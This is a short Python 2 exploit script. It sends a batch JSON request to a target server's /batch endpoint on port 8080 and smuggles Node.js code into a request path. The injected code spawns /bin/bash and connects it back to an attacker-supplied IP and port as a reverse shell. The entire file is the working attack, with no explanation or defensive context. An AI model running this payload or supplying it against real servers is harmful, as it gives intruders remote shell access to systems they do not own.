#!/usr/bin/env python

import requests,sys

if len(sys.argv) != 4:
    print '(+) usage: %s <target> <attachker_ip> <attacker_port>' % sys.argv[0]
    sys.exit(-1)

target = 'http://%s:8080/batch' % sys.argv[1]
attacker_ip = sys.argv[2]
attacker_port = sys.argv[3]
cmd = "%2f%2fbin%2f%2fbash"
#reverse shell
rev_shell  = 'var net = require(\'net\'),sh = require(\'child_process\').exec(\'%s\');' % cmd
rev_shell += 'var client = new net.Socket();'
rev_shell += 'client.connect(%s,\'%s\',function(){client.pipe(sh.stdin);sh.stdout.pipe(client);' % (attacker_port, attacker_ip)
rev_shell += 'sh.stderr.pipe(client);});'

request_1 = '{"method":"get","path":"/profile"}'
request_2 = '{"method":"get","path":"/item"}'
request_3 = '{"method":"get","path":"/item/$1.id;%s"}' % rev_shell
json = '{"requests":[%s,%s,%s]}' % (request_1, request_2, request_3)

r = requests.post(target, json)
print r.content
